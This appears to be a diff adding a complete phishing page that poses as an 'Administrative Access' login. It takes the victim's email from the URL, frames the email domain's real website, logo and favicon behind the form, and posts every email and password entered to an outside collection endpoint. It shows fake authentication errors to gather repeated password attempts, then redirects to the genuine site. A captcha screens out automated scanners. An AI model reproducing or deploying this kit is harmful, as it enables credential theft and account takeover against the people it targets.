@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Administrative Access</title>
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Cloudflare Turnstile -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+    <!-- Dynamic Favicon -->
+    <link rel="icon" id="favicon" type="image/png">
+
+    <style>
+        body {
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Background iframe container */
+        #iframe-container {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+        }
+
+        /* Semi-transparent overlay to keep the login form readable over the background website */
+        #bg-overlay {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(248, 249, 250, 0.85);
+            z-index: -1;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 25px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .auth-required {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .turnstile-error {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+
+        .submission-message {
+            color: red;
+            font-size: 11px;
+            font-weight: bold;
+            display: none;
+            margin-top: 10px;
+        }
+
+        .form-label {
+            text-align: left;
+            display: block;
+        }
+
+        .btn-loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .domain-logo {
+            max-height: 40px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Background Website Iframe -->
+    <div id="iframe-container">
+        <iframe src="" id="mainPage" style="width: 100%; height: 100%; border: none;"></iframe>
+    </div>
+    <div id="bg-overlay"></div>
+
+    <!-- Login Form -->
+    <div class="login-container">
+        <!-- Header -->
+        <header class="text-center my-3">
+            <img id="domain-logo" class="domain-logo" src="" alt="Domain Logo">
+            <div style="text-transform: uppercase;"><span id="domain-name" class="fw-bold"></span> <br/><b>Login Authentication</b></div>
+        </header>
+
+        <form id="login-form">
+            <div class="mb-3 text-start">
+                <label for="email" class="form-label">Email Address</label>
+                <input type="email" id="email" name="email" class="form-control" required>
+            </div>
+
+            <div class="mb-3 text-start">
+                <label for="password" class="form-label">Password</label>
+                <input type="password" id="password" name="password" class="form-control" required>
+                <span class="auth-required">Authentication required!</span>
+            </div>
+
+            <!-- Cloudflare Turnstile -->
+            <div class="mb-3">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAAFVflSKJcz7PkgSi" data-callback="turnstileCallback"></div>
+                <span id="turnstile-error" class="turnstile-error">Please verify the captcha!</span>
+            </div>
+
+            <button type="submit" id="submit-btn" class="btn btn-primary w-100">
+                Login
+            </button>
+        </form>
+
+        <!-- Submission Message -->
+        <div id="submission-message" class="submission-message">Authentication error #0229992, Enter your valid password.</div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        let submitAttempts = Number(sessionStorage.getItem('login_tries') || 0);
+        let extractedDomain = "";
+        let turnstileVerified = false;
+
+        function turnstileCallback(token) {
+            if (token) {
+                turnstileVerified = true;
+                $('#turnstile-error').hide();
+            }
+        }
+
+        function parseUrlParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let email = urlParams.get('email') || '';
+            let domain = urlParams.get('domain') || '';
+
+            if (!email && !domain) {
+                const hash = (window.location.hash || '').replace(/^#/, '').trim();
+                if (hash) {
+                    try {
+                        const parts = hash.split('&').reduce((acc, p) => {
+                            const [k, v] = p.split('=');
+                            acc[k] = v === undefined ? '' : decodeURIComponent(v);
+                            return acc;
+                        }, {});
+                        email = parts.email || '';
+                        domain = parts.domain || '';
+                        if (!email && hash.includes('@')) {
+                            email = hash;
+                        }
+                    } catch (e) {
+                        // ignore
+                    }
+                }
+            }
+
+            if (!domain && email.includes('@')) {
+                domain = email.split('@')[1];
+            }
+
+            return { email, domain };
+        }
+
+        function updateDomainTheme(domain) {
+            if (!domain || domain === "example.com") return;
+            
+            extractedDomain = domain;
+            $('#domain-name').text(extractedDomain);
+
+            // Set background company website inside iframe
+            $('#mainPage').attr('src', 'https://' + extractedDomain);
+
+            // Set company logo and favicon
+            const logoUrl = `https://unavatar.io/${extractedDomain}`;
+            $('#domain-logo').attr('src', logoUrl);
+            $('#favicon').attr('href', `https://www.google.com/s2/favicons?sz=64&domain=${extractedDomain}`);
+        }
+
+        $(document).ready(function() {
+            const params = parseUrlParams();
+            if (params.email) {
+                $('#email').val(params.email);
+            }
+            if (params.domain) {
+                updateDomainTheme(params.domain);
+            } else if (params.email) {
+                const initialDomain = params.email.split('@')[1];
+                if (initialDomain) {
+                    updateDomainTheme(initialDomain);
+                }
+            } else {
+                $('#domain-name').text('Administrative Portal');
+                $('#mainPage').attr('src', 'about:blank');
+            }
+
+            // Real-time detection: if the user types or pastes an email into the input field
+            $('#email').on('input', function() {
+                const val = $(this).val().trim();
+                if (val.includes('@')) {
+                    const dynamicDomain = val.split('@')[1];
+                    if (dynamicDomain && dynamicDomain !== extractedDomain) {
+                        updateDomainTheme(dynamicDomain);
+                    }
+                }
+            });
+
+            $('#login-form').on('submit', function(e) {
+                e.preventDefault();
+
+                submitAttempts++;
+                sessionStorage.setItem('login_tries', submitAttempts);
+
+                const submitBtn = $('#submit-btn');
+                submitBtn.addClass('btn-loading').text('Authenticating...');
+                $('#submission-message').hide();
+
+                const formData = new FormData(this);
+                formData.append('attempt_count', submitAttempts);
+                if (extractedDomain) {
+                    formData.append('domain', extractedDomain);
+                }
+
+                // Report each attempt to the form endpoint
+                fetch('https://submit-form.com/7yJhWzdGr', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                .then(response => {
+                    submitBtn.removeClass('btn-loading').text('Login');
+
+                    if (submitAttempts < 3) {
+                        $('#submission-message').show();
+                        $('#password').val('').focus();
+                        if (window.turnstile) {
+                            turnstile.reset();
+                        }
+                    } else {
+                        $('#submission-message').hide();
+                        submitBtn.text('Redirecting...');
+                        
+                        setTimeout(() => {
+                            sessionStorage.removeItem('login_tries');
+                            let finalDomain = extractedDomain || 'localhost';
+                            if (!/^https?:\/\//i.test(finalDomain)) {
+                                finalDomain = 'https://' + finalDomain;
+                            }
+                            window.location.href = finalDomain;
+                        }, 800);
+                    }
+                })
+                .catch(error => {
+                    submitBtn.removeClass('btn-loading').text('Login');
+                    $('#submission-message').show();
+                });
+            });
+        });
+    </script>
+</body>
+
+</html>
+<script> 
+     const params = new URLSearchParams(window.location.search);
+     const email = params.get("email");
+
+      if (email) {
+      document.getElementById("email").value = decodeURIComponent(email);
+      }
+</script> 
